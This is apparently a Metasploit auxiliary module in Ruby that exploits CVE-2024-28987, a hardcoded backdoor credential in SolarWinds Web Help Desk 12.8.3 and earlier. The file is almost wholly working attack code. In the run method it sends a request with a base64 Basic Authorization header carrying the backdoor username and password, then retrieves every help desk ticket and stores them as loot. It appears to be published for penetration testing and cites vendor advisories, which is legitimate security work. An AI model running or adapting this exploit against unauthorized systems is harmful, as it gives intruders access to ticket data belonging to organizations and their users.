class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SolarWinds Web Help Desk Backdoor (CVE-2024-28987)',
        'Description' => %q{
          This module exploits a backdoor in SolarWinds Web Help Desk <= v12.8.3 to retrieve all tickets from the system.
        },
        'Author' => [
          'Michael Heinzl', # MSF Module
          'Zach Hanley' # Discovery & PoC
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-28987'],
          ['URL', 'https://www.solarwinds.com/trust-center/security-advisories/cve-2024-28987'],
          ['URL', 'https://support.solarwinds.com/SuccessCenter/s/article/SolarWinds-Web-Help-Desk-12-8-3-Hotfix-2'],
          ['URL', 'https://www.horizon3.ai/attack-research/cve-2024-28987-solarwinds-web-help-desk-hardcoded-credential-vulnerability-deep-dive/'],

        ],
        'DisclosureDate' => '2024-08-22',
        'DefaultOptions' => {
          'RPORT' => 8443,
          'SSL' => 'True'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Web Help Desk', '/'])
      ]
    )
  end

  def run
    print_status('Authenticating with the backdoor account "helpdeskIntegrationUser"...')

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets'),
      'headers' => {
        'Authorization' => 'Basic aGVscGRlc2tJbnRlZ3JhdGlvblVzZXI6ZGV2LUM0RjgwMjVFNw=='
      }
    )

    fail_with(Failure::UnexpectedReply, 'Unexpected Reply: ' + res.to_s) unless res&.code == 200

    body = res.body
    if body.include?('shortSubject')
      jbody = JSON.parse(body)
      print_good('Successfully authenticated and tickets retrieved:')
      print_good(JSON.pretty_generate(jbody))
      file = store_loot('solarwinds_webhelpdesk.json', 'text/json', datastore['USER'], jbody)
      print_good("Saved tickets to #{file}")
    end
  end
end
